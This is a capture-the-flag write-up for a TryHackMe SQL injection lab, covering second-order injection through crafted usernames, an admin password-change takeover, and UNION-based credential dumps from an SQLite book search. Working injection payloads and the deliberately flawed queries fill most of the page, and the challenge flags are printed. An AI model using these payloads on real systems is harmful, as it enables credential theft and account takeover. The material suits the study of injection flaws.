<p>In this challenge, the previous vulnerability related to the login function has been fixed. A new note function has been added which allows a user to add notes on their page.</p>
<p>Let's begin by exploring the new note functionality added by the developers. Since the login form is not longer vulnerable to SQLi, we will need to create a dummy account to permit recon. It looks like the login form is using parameterized queries to prevent inputs from leading to SQL injection.</p>
<p><img alt="Vulnerable Startup: Vulnerable Notes" src="../../../assets/images/thm/sqlilab/33%20-%20vulnerable%20startup%20-%20vulnerable%20notes.png" /></p>
<p>We can test to see the input fields in the Notes form are vulnerable to SQLi.</p>
<p><img alt="Vulnerable Startup: Vulnerable Notes SQLi" src="../../../assets/images/thm/sqlilab/34%20-%20vulnerable%20startup%20-%20vulnerable%20notes.png" /></p>
<p>The input fields don't appear to be vulnerable (form is most likely using parameterized queries as well) however input sanitization does not appear to be implemented. This means that the server will accept malicious data and place it in the database since the application does not sanitize it.</p>
<p>Based on this knowledge, we can infer that parameterized queries are implemented for all input fields but input sanitization is not implemented globally. Let's see what happens if we create an account with a malicious username.</p>
<p><div class="highlight"><pre><span></span><code><a id="__codelineno-38-1" name="__codelineno-38-1" href="#__codelineno-38-1"></a><span class="err">&#39;</span><span class="w"> </span><span class="k">UNION</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="c1">--</span>
</code></pre></div>
Creating and logging in with the username above indicates that while parameterized queries may be used in all input fields, the function which retrieves the notes for a particular user does not appear to use parameterized queries. Our malicious username appears to be directly concatenated into the SQL query making it the function vulnerable to SQL injection.</p>
<p><img alt="Vulnerable Startup: Vulnerable Notes SQLi Success" src="../../../assets/images/thm/sqlilab/35%20-%20vulnerable%20startup%20-%20vulnerable%20notes.png" /></p>
<p>The first column holds data from the <code>Title</code> field while the second column holds data from the <code>Note</code> field. On a side note, a username with incorrect column numbers displays no notes. With this knowledge, we can start enumerating the database. As the table is based on the same challenge as the last one, it is safe to assume that we are dealing with SQLite.</p>
<p>Let's begin by enumerating the tables in the database by creating the following username.</p>
<p><div class="highlight"><pre><span></span><code><a id="__codelineno-39-1" name="__codelineno-39-1" href="#__codelineno-39-1"></a><span class="s1">&#39; UNION SELECT 1,group_concat(tbl_name) from sqlite_master where type=&#39;</span><span class="k">table</span><span class="s1">&#39; and tbl_name not like &#39;</span><span class="n">sqlite_</span><span class="o">%</span><span class="err">&#39;</span><span class="c1">--</span>
</code></pre></div>
<br></p>
<p><img alt="Vulnerable Startup: Vulnerable Notes SQLi Tables" src="../../../assets/images/thm/sqlilab/36%20-%20vulnerable%20startup%20-%20vulnerable%20notes.png" /></p>
<p>Let's enumerate columns from the <code>users</code> table by creating the following username.</p>
<p><div class="highlight"><pre><span></span><code><a id="__codelineno-40-1" name="__codelineno-40-1" href="#__codelineno-40-1"></a><span class="s1">&#39; UNION SELECT 1,sql FROM sqlite_master WHERE type!=&#39;</span><span class="n">meta</span><span class="s1">&#39; AND sql NOT NULL AND name =&#39;</span><span class="n">users</span><span class="err">&#39;</span><span class="c1">--</span>
</code></pre></div>
<br></p>
<p><img alt="Vulnerable Startup: Vulnerable Notes SQLi Columns" src="../../../assets/images/thm/sqlilab/37%20-%20vulnerable%20startup%20-%20vulnerable%20notes.png" /></p>
<p>Now that we know the columns, we can go ahead and extract the usernames and passwords from the table by creating the following username.</p>
<p><div class="highlight"><pre><span></span><code><a id="__codelineno-41-1" name="__codelineno-41-1" href="#__codelineno-41-1"></a><span class="err">&#39;</span><span class="w"> </span><span class="k">UNION</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="n">group_concat</span><span class="p">(</span><span class="n">username</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="ss">&quot;:&quot;</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="n">password</span><span class="p">)</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">users</span><span class="c1">--</span>
</code></pre></div>
<br></p>
<p><img alt="Vulnerable Startup: Vulnerable Notes SQLi Data Dump" src="../../../assets/images/thm/sqlilab/38%20-%20vulnerable%20startup%20-%20vulnerable%20notes.png" /></p>
<p>Retrieved Flag: <code>THM{4644c7e157fd5498e7e4026c89650814}</code></p>
<p>Note that we can also solve this challenge using sqlimap and a tamper script. For more information refer to <a href="https://tryhackme.com/room/sqlilab">SQL Injection Lab</a> room on THM.</p>
<h3 id="vulnerable-startup-change-password">Vulnerable Startup: Change Password<a class="headerlink" href="#vulnerable-startup-change-password" title="Permanent link">&para;</a></h3>
<p>For this challenge, the vulnerability on the Notes form has been fixed. The devs have implemented new functionality to allow a user to change their password by navigating to the Profile page. The goal of this challenge is to log into the <code>admin</code> account in order to retrieve the flag.</p>
<p>It is not uncommon for password change functionality to be implement using UPDATE SQL statements. Typically, a developer would ensure that parameterized queries are used for all input fields such as username and passwords along with input sanitization.</p>
<p>A poorly implemented SQL query for a password change functionality would look something like the following.</p>
<p><div class="highlight"><pre><span></span><code><a id="__codelineno-42-1" name="__codelineno-42-1" href="#__codelineno-42-1"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">username</span><span class="p">,</span><span class="w"> </span><span class="n">password</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">id</span><span class="w"> </span><span class="o">=?</span><span class="p">;</span>
<a id="__codelineno-42-2" name="__codelineno-42-2" href="#__codelineno-42-2"></a><span class="k">UPDATE</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="k">SET</span><span class="w"> </span><span class="n">password</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">?</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">username</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;&quot; + username +&quot;&#39;</span><span class="p">;</span>
</code></pre></div>
In the above queries, both the  id and password field uses parameterized query. The second query, however, directly concatenates the username to the statement. The assumption some developers make is that since the username does not come directly from an input in the password change form but is rather fetched from the database based on the user id stored in the session object, additional precautions do not need to be taken. An attacker can leverage this oversight by crafting malicious usernames which allows changing the password of a different user (ie. admin).</p>
<p>Let's begin by creating a malicious username in hopes that the username is directly concatenated into a query similar to the example above.</p>
<p><div class="highlight"><pre><span></span><code><a id="__codelineno-43-1" name="__codelineno-43-1" href="#__codelineno-43-1"></a><span class="k">admin</span><span class="err">&#39;</span><span class="c1">--</span>
</code></pre></div>
<br></p>
<p><img alt="Vulnerable Startup: Change Password User" src="../../../assets/images/thm/sqlilab/39%20-%20vulnerable%20startup%20-%20change%20password.png" /></p>
<p>We can see from the above image that input sanitation is not implemented. Let's see if the developer implemented unsafe functionality as described above. With our malicious username, the above SQL queries would result in the following.</p>
<p><div class="highlight"><pre><span></span><code><a id="__codelineno-44-1" name="__codelineno-44-1" href="#__codelineno-44-1"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">username</span><span class="p">,</span><span class="w"> </span><span class="n">password</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">id</span><span class="w"> </span><span class="o">=?</span><span class="p">;</span>
<a id="__codelineno-44-2" name="__codelineno-44-2" href="#__codelineno-44-2"></a><span class="k">UPDATE</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="k">SET</span><span class="w"> </span><span class="n">password</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">?</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">username</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;admin&#39;</span><span class="c1">--&#39;;</span>
</code></pre></div>
Note how the executed query would result in a password change for the <code>admin</code> user rather than our malicious <code>admin'--</code> user. Let's see if this works in practice.</p>
<p>Go to the Profile page and change the password to <code>testpass</code> for our malicious username.</p>
<p><img alt="Vulnerable Startup: Password Change" src="../../../assets/images/thm/sqlilab/40%20-%20vulnerable%20startup%20-%20change%20password.png" /></p>
<p>Let's see if our assumption is correct and try logging in using the following credentials: <code>admin:testpass</code>.</p>
<p><img alt="Vulnerable Startup: Password Change Successful Login" src="../../../assets/images/thm/sqlilab/41%20-%20vulnerable%20startup%20-%20change%20password.png" /></p>
<p>Looks like we were successful in changing the administrator user's password.</p>
<p>Retrieved Flag: <code>THM{cd5c4f197d708fda06979f13d8081013}</code></p>
<h3 id="vulnerable-startup-book-title">Vulnerable Startup: Book Title<a class="headerlink" href="#vulnerable-startup-book-title" title="Permanent link">&para;</a></h3>
<p>In this challenge, we will be looking at a vulnerable search functionality added to the web application. Based on the information provided by the developer, the application concatenates the user input directly into the SQL statement. The gaol of this challenge is to abuse this vulnerability and find the hidden flag.</p>
<p>Let's begin by creating a temporary account and log in so that we can test the functionality. It looks like the web application makes a GET request everything a search for a book title is made and displays the results in the web application.</p>
<p><img alt="Vulnerable Startup: Book Title GET" src="../../../assets/images/thm/sqlilab/42%20-%20vulnerable%20startup%20-%20book%20title.png" /></p>
<p><img alt="Vulnerable Startup: Book Title Search" src="../../../assets/images/thm/sqlilab/43%20-%20vulnerable%20startup%20-%20book%20title.png" /></p>
<p>Based on developer's notes, the backend makes the following query when a search is made.</p>
<p><div class="highlight"><pre><span></span><code><a id="__codelineno-45-1" name="__codelineno-45-1" href="#__codelineno-45-1"></a><span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">books</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">id</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="k">SELECT</span><span class="w"> </span><span class="n">id</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">books</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">title</span><span class="w"> </span><span class="k">like</span><span class="w"> </span><span class="s1">&#39;&quot; + title + &quot;%&#39;</span><span class="p">)</span>
</code></pre></div>
The above query is vulnerable to SQLi as any input into the search field is concatenated directly into the query. Let's inject the following input and see what happens.</p>
<p><div class="highlight"><pre><span></span><code><a id="__codelineno-46-1" name="__codelineno-46-1" href="#__codelineno-46-1"></a><span class="err">&#39;</span><span class="p">)</span><span class="w"> </span><span class="k">OR</span><span class="w"> </span><span class="mi">1</span><span class="o">=</span><span class="mi">1</span><span class="c1">--</span>
</code></pre></div>
The above statement converts the search statement into the following always TRUE statement.</p>
<p><div class="highlight"><pre><span></span><code><a id="__codelineno-47-1" name="__codelineno-47-1" href="#__codelineno-47-1"></a><span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">books</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">id</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="k">SELECT</span><span class="w"> </span><span class="n">id</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">books</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">title</span><span class="w"> </span><span class="k">like</span><span class="w"> </span><span class="s1">&#39;&#39;</span><span class="p">)</span><span class="w"> </span><span class="k">OR</span><span class="w"> </span><span class="mi">1</span><span class="o">=</span><span class="mi">1</span><span class="c1">--&#39;&#39;)</span>
</code></pre></div>
<br></p>
<p><img alt="Vulnerable Startup: Book Title Dump" src="../../../assets/images/thm/sqlilab/44%20-%20vulnerable%20startup%20-%20book%20title.png" /></p>
<p>Looks like we get a full dump of the book titles in the database. With this knowledge, we can attempy UNION based attacks and attempt to enumerate and extract the credentials. As with previous challenges, the database is built upon SQLite so we will proceed with this in mind.</p>
<p>Let's begin by first enumerating the number of columns in the table. Just by looking at the full dump of the book titles, we can infer the number of columns. There are columns reserved for the title of the book, description, author and some sort of an integer id identifier. So let's test to see if 4 columns is the correct number. </p>
<p><div class="highlight"><pre><span></span><code><a id="__codelineno-48-1" name="__codelineno-48-1" href="#__codelineno-48-1"></a><span class="err">&#39;</span><span class="p">)</span><span class="w"> </span><span class="k">UNION</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">4</span><span class="c1">--</span>
</code></pre></div>
<br></p>
<p><img alt="Vulnerable Startup: Book Title Column Numbers" src="../../../assets/images/thm/sqlilab/45%20-%20vulnerable%20startup%20-%20book%20title.png" /></p>
<p>Looks like our inference was correct and the table in question has 4 columns. Let's proceed with enumerating the tables in the database.</p>
<p><div class="highlight"><pre><span></span><code><a id="__codelineno-49-1" name="__codelineno-49-1" href="#__codelineno-49-1"></a><span class="s1">&#39;) UNION SELECT 1,2,3,group_concat(tbl_name) from sqlite_master where type=&#39;</span><span class="k">table</span><span class="s1">&#39; and tbl_name not like &#39;</span><span class="n">sqlite_</span><span class="o">%</span><span class="err">&#39;</span><span class="c1">--</span>
</code></pre></div>
<br></p>
<p><img alt="Vulnerable Startup: Book Title Tables" src="../../../assets/images/thm/sqlilab/46%20-%20vulnerable%20startup%20-%20book%20title.png" /></p>
<p>The table we are interested in the <code>users</code> table. Enumerate the columns from the table.</p>
<p><div class="highlight"><pre><span></span><code><a id="__codelineno-50-1" name="__codelineno-50-1" href="#__codelineno-50-1"></a><span class="s1">&#39;) UNION SELECT 1,2,3,sql FROM sqlite_master WHERE type!=&#39;</span><span class="n">meta</span><span class="s1">&#39; AND sql NOT NULL AND name =&#39;</span><span class="n">users</span><span class="err">&#39;</span><span class="c1">--</span>
</code></pre></div>
<br></p>
<p><img alt="Vulnerable Startup: Book Title Users Columns" src="../../../assets/images/thm/sqlilab/47%20-%20vulnerable%20startup%20-%20book%20title.png" /></p>
<p>Let's extract the credentials.</p>
<p><div class="highlight"><pre><span></span><code><a id="__codelineno-51-1" name="__codelineno-51-1" href="#__codelineno-51-1"></a><span class="err">&#39;</span><span class="p">)</span><span class="w"> </span><span class="k">UNION</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="n">group_concat</span><span class="p">(</span><span class="n">username</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="ss">&quot;:&quot;</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="n">password</span><span class="p">)</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">users</span><span class="c1">--</span>
</code></pre></div>
<br></p>
<p><img alt="Vulnerable Startup: Book Title Credentials" src="../../../assets/images/thm/sqlilab/48%20-%20vulnerable%20startup%20-%20book%20title.png" /></p>
<p>Retrieved Flag: <code>THM{27f8f7ce3c05ca8d6553bc5948a89210}</code></p>
<h3 id="vulnerable-startup-book-title-2">Vulnerable Startup: Book Title 2<a class="headerlink" href="#vulnerable-startup-book-title-2" title="Permanent link">&para;</a></h3>
<p>In this challenge, the web application uses the results of one query in to an other without properly sanitizing the data. Both queries are vulnerable as the first query can be exploited through blind SQL injection. However, since the second query is also vulnerable, we can simplify the exploitation and use UNION based injection instead of Boolean-based blind injection. The goal of this task is to exploit the vulnerability without using blind SQL injection and retrieve the credentials.</p>
<p>Based on developer's notes provided, the backend queries excluded look like the following.</p>
<p><div class="highlight"><pre><span></span><code><a id="__codelineno-52-1" name="__codelineno-52-1" href="#__codelineno-52-1"></a><span class="n">bid</span> <span class="o">=</span> <span class="n">db</span><span class="o">.</span><span class="n">sql_query</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;SELECT id FROM books WHERE title like &#39;</span><span class="si">{</span><span class="n">title</span><span class="si">}</span><span class="s2">%&#39;&quot;</span><span class="p">,</span> <span class="n">one</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
<a id="__codelineno-52-2" name="__codelineno-52-2" href="#__codelineno-52-2"></a><span class="k">if</span> <span class="n">bid</span><span class="p">:</span>
<a id="__codelineno-52-3" name="__codelineno-52-3" href="#__codelineno-52-3"></a>    <span class="n">query</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&quot;SELECT * FROM books WHERE id = &#39;</span><span class="si">{</span><span class="n">bid</span><span class="p">[</span><span class="s1">&#39;id&#39;</span><span class="p">]</span><span class="si">}</span><span class="s2">&#39;&quot;</span>
</code></pre></div>
Here, the first query retrieves the ID of the book while second query retrieves the data associated with the ID from the first query. We can exploit this crafting a malicious input for the first query which will then be executed by the second.</p>
<p>By injecting:</p>
<p><div class="highlight"><pre><span></span><code><a id="__codelineno-53-1" name="__codelineno-53-1" href="#__codelineno-53-1"></a><span class="s1">&#39; UNION SELECT &#39;</span><span class="n">test</span>
</code></pre></div>
We should get a resultant executed query of:</p>
<p><div class="highlight"><pre><span></span><code><a id="__codelineno-54-1" name="__codelineno-54-1" href="#__codelineno-54-1"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">id</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">books</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">title</span><span class="w"> </span><span class="k">like</span><span class="w"> </span><span class="s1">&#39;test%&#39;</span><span class="p">;</span>
<a id="__codelineno-54-2" name="__codelineno-54-2" href="#__codelineno-54-2"></a><span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">books</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">id</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;test%&#39;</span><span class="p">;</span>
</code></pre></div>
If we are able to guess an ID which exists in the database, we may be able confirm UNION based injection. Let's try an ID of 1.</p>
<p><div class="highlight"><pre><span></span><code><a id="__codelineno-55-1" name="__codelineno-55-1" href="#__codelineno-55-1"></a><span class="s1">&#39; UNION SELECT &#39;</span><span class="mi">1</span><span class="err">&#39;</span><span class="c1">--</span>
</code></pre></div>
This should give a resultant executed query of:</p>
<p><div class="highlight"><pre><span></span><code><a id="__codelineno-56-1" name="__codelineno-56-1" href="#__codelineno-56-1"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">id</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">books</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">title</span><span class="w"> </span><span class="k">like</span><span class="w"> </span><span class="s1">&#39;&#39;</span><span class="w"> </span><span class="k">UNION</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="s1">&#39;1&#39;</span><span class="c1">--%&#39;;</span>
<a id="__codelineno-56-2" name="__codelineno-56-2" href="#__codelineno-56-2"></a><span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">books</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">id</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;1&#39;</span><span class="p">;</span>
</code></pre></div>
<br></p>
<p><img alt="Vulnerable Startup: Book Title 2 SQLi" src="../../../assets/images/thm/sqlilab/49%20-%20vulnerable%20startup%20-%20book%20title%202.png" /></p>
<p>Looks like we have success with our guess. Since we know that our malicious input from the first query is being passed unsanitized to the second query, we can begin enumerating the database. First step is to figure out the number of columns in the current table.</p>
<p>In order to confirm the number of columns in the database, we need the second query to execute the following query.</p>
<p><div class="highlight"><pre><span></span><code><a id="__codelineno-57-1" name="__codelineno-57-1" href="#__codelineno-57-1"></a><span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">books</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">id</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;&#39;</span><span class="w"> </span><span class="k">UNION</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,...</span>
</code></pre></div>
We will need to work backwards. Say we inject the following:</p>
<p><div class="highlight"><pre><span></span><code><a id="__codelineno-58-1" name="__codelineno-58-1" href="#__codelineno-58-1"></a><span class="s1">&#39; UNION SELECT &#39;</span><span class="mi">1</span><span class="err">&#39;</span><span class="w"> </span><span class="k">UNION</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">4</span><span class="c1">--</span>
</code></pre></div>
The resultant executed queries would look like the following.</p>
<p><div class="highlight"><pre><span></span><code><a id="__codelineno-59-1" name="__codelineno-59-1" href="#__codelineno-59-1"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">id</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">books</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">title</span><span class="w"> </span><span class="k">like</span><span class="w"> </span><span class="s1">&#39;&#39;</span><span class="w"> </span><span class="k">UNION</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="s1">&#39;1&#39;</span><span class="w"> </span><span class="k">UNION</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">4</span><span class="c1">--%&#39;;</span>
<a id="__codelineno-59-2" name="__codelineno-59-2" href="#__codelineno-59-2"></a><span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">books</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">id</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;1 UNION SELECT 1,2,3,4--%&#39;</span><span class="p">;</span>
</code></pre></div>
This breaks the query and thus nothing get's executed. This happens because  our original injected input closes the string that is supposed to be returned by appending the single quote before the second UNION clause. In order to fix this syntax issue, we will need to escape the single quote.</p>
<p><div class="highlight"><pre><span></span><code><a id="__codelineno-60-1" name="__codelineno-60-1" href="#__codelineno-60-1"></a><span class="s1">&#39; UNION SELECT &#39;</span><span class="mi">1</span><span class="s1">&#39;&#39;</span><span class="w"> </span><span class="k">UNION</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">4</span><span class="c1">--</span>
</code></pre></div>
Escaping the appended single quote before the second UNION statement should result in the following executed query.</p>
<p><div class="highlight"><pre><span></span><code><a id="__codelineno-61-1" name="__codelineno-61-1" href="#__codelineno-61-1"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">id</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">books</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">title</span><span class="w"> </span><span class="k">like</span><span class="w"> </span><span class="s1">&#39;&#39;</span><span class="w"> </span><span class="k">UNION</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="s1">&#39;1&#39;&#39; UNION SELECT 1,2,3,4--%&#39;</span><span class="p">;</span>
<a id="__codelineno-61-2" name="__codelineno-61-2" href="#__codelineno-61-2"></a><span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">books</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">id</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;1&#39;</span><span class="w"> </span><span class="k">UNION</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">4</span><span class="c1">--%&#39;;</span>
</code></pre></div>
<br></p>
<p><img alt="Vulnerable Startup: Book Title 2 Second Query Injection" src="../../../assets/images/thm/sqlilab/50%20-%20vulnerable%20startup%20-%20book%20title%202.png" /></p>
<p>Looks like we have success. Let's go ahead and modify our payload so it returns an invalid record to make things clearer.</p>
<p><div class="highlight"><pre><span></span><code><a id="__codelineno-62-1" name="__codelineno-62-1" href="#__codelineno-62-1"></a><span class="s1">&#39; UNION SELECT &#39;</span><span class="o">-</span><span class="mi">1</span><span class="s1">&#39;&#39;</span><span class="w"> </span><span class="k">UNION</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">4</span><span class="c1">--</span>
</code></pre></div>
<br></p>
<p><img alt="Vulnerable Startup: Book Title 2 Columns" src="../../../assets/images/thm/sqlilab/51%20-%20vulnerable%20startup%20-%20book%20title%202.png" /></p>
<p>Like the previous challenge, the credentials are stored in the <code>users</code> table under the columns <code>username</code> and <code>password</code>. Let's go ahead and extract them and finish the challenge.</p>
<p><div class="highlight"><pre><span></span><code><a id="__codelineno-63-1" name="__codelineno-63-1" href="#__codelineno-63-1"></a><span class="s1">&#39; UNION SELECT &#39;</span><span class="o">-</span><span class="mi">1</span><span class="s1">&#39;&#39;</span><span class="w"> </span><span class="k">UNION</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="n">group_concat</span><span class="p">(</span><span class="n">username</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="ss">&quot;:&quot;</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="n">password</span><span class="p">)</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">users</span><span class="c1">--</span>
</code></pre></div>
<br></p>
<p><img alt="Vulnerable Startup: Book Title 2 Creds" src="../../../assets/images/thm/sqlilab/52%20-%20vulnerable%20startup%20-%20book%20title%202.png" /></p>
<p>Retrieved Flag: <code>THM{183526c1843c09809695a9979a672f09}</code></p>







  
    
  
  


  <aside class="md-source-file">
    
      
  <span class="md-source-file__fact">
    <span class="md-icon" title="Last update">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M21 13.1c-.1 0-.3.1-.4.2l-1 1 2.1 2.1 1-1c.2-.2.2-.6 0-.8l-1.3-1.3c-.1-.1-.2-.2-.4-.2m-1.9 1.8-6.1 6V23h2.1l6.1-6.1zM12.5 7v5.2l4 2.4-1 1L11 13V7zM11 21.9c-5.1-.5-9-4.8-9-9.9C2 6.5 6.5 2 12 2c5.3 0 9.6 4.1 10 9.3-.3-.1-.6-.2-1-.2s-.7.1-1 .2C19.6 7.2 16.2 4 12 4c-4.4 0-8 3.6-8 8 0 4.1 3.1 7.5 7.1 7.9l-.1.2z"/></svg>
    </span>
    <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-date">November 27, 2024</span>
  </span>

    
    
    
    
  </aside>





                
              </article>
            </div>
          
          
<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
        </div>
        
          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
  Back to top
</button>
        
      </main>
      
        <footer class="md-footer">
  
    
      
      <nav class="md-footer__inner md-grid" aria-label="Footer" >
        
          
          <a href="../sqlinjection/" class="md-footer__link md-footer__link--prev" aria-label="Previous: SQL Injection">
            <div class="md-footer__button md-icon">
              
              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
            </div>
            <div class="md-footer__title">
              <span class="md-footer__direction">
                Previous
              </span>
              <div class="md-ellipsis">
                SQL Injection
              </div>
            </div>
          </a>
        
        
          
          <a href="../ssrf/" class="md-footer__link md-footer__link--next" aria-label="Next: SSRF">
            <div class="md-footer__title">
              <span class="md-footer__direction">
                Next
              </span>
              <div class="md-ellipsis">
                SSRF
              </div>
            </div>
            <div class="md-footer__button md-icon">
              
              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11z"/></svg>
            </div>
          </a>
        
      </nav>
    
  
  <div class="md-footer-meta md-typeset">
    <div class="md-footer-meta__inner md-grid">
      <div class="md-copyright">
  
    <div class="md-copyright__highlight">
      &copy; 2024 Nouman Noor
    </div>
  
  
    Made with
    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
      Material for MkDocs
    </a>
  
</div>
      
        <div class="md-social">
  
    
    
    
    
      
      
    
    <a href="https://github.com/nanoor" target="_blank" rel="noopener" title="github.com" class="md-social__link">
